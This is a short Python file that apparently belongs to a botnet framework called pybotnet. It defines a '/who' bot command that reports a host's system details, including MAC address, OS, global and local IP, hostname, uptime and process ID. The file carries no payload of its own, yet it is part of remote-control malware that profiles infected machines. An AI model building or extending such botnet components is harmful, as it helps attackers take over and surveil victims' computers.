from .. import BotNet, Request


@BotNet.default_script(script_version="0.0.1")
def who(request: Request) -> str:
    """return system info
example command: `/who` \n
return:
* scripts_name
* mac_addres
* os
* global_ip
* up_time
* host_name
* local_ip
* current_route
* pid
* cpu_count
* pybotnet_version
"""

    info = ""

    for k, v in request.sytsem_data.items():
        info += f"\n{k}: {v}"
    return info